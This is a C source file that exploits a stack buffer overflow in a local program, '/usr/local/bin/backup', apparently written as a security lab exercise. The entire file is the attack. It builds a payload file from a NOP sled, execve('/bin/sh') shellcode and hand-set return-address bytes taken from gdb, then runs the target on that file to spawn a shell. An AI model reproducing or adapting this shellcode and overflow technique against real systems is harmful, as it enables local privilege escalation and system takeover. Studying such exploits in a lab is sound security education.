#include <stdio.h>
#include <unistd.h>
/*#include </usr/local/src/shellcode.h>*/ /*Our shellcode is 39 bytes or 41 with /bin/sh included*/

#define TARGET "/usr/local/bin/backup" /* or backupV2*/ 

#define PAYLOAD_BUFFER_SIZE 3017 /*Our payload should be 8 bytes bigger than the actual buffer so that it overflows past the EBP into RET. mod 16 gives us 0 hence stack aligned*/
#define NOP 0x90

static char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";
  
int main(int argc, char **argv) 
{
	char *args[4];
	char *env[1];


	char payload[PAYLOAD_BUFFER_SIZE]; 	   /*A payload buffer to store the actual payload code*/
	FILE* payloadOutputFile; /*We're going to store our payload buffer into this file.*/

	 /*Address of buffer found via gdb is 0xffbfd050
	 We will be targeting this address.*/
	long *bufferAddress = (long*)0xffbfd160;

	/*First we fill payload buffer with the address of the target (buffer address)*/
	int i, j;

	/*Fill buffer with address entirely*/
	long * addr_ptr = (long *)payload;
	for (i = 0; i < PAYLOAD_BUFFER_SIZE/4; ++ i)
	{
		*(addr_ptr ++) =  (long)bufferAddress;
	}
	
	/*
	for(i = 0; i < PAYLOAD_BUFFER_SIZE; ++ i)
	{
		payload[i] = 'A';
	}*/

	/*Set half char as NOP*/
	for(i = 0; i < 400; ++ i)
	{
		payload[i] = NOP;
	}
	
	/*Place shellcode after NOP*/

	for (i = 400, j = 0; j < strlen(shellcode); ++i, ++j)
	{
		payload[i] = shellcode[j];
	}
	
	payload[3004] = 0xC4;
	
	payload[3012] = 0x88;
	payload[3013] = 0xd1;
	payload[3014] = 0xbf;
	payload[3015] = 0xff;
	
	payload[PAYLOAD_BUFFER_SIZE-1] = '\0';

	payloadOutputFile = fopen("payload.txt", "w+");
		
	fputs(payload, payloadOutputFile);
	
	fclose(payloadOutputFile);
	

	args[0] = TARGET; args[1] = "backup";
	args[2] = "payload.txt"; args[3] = NULL;
	env[0] = NULL;

	if (execve(args[0], args, env) < 0)
		fprintf(stderr, "execve failed.\n");
}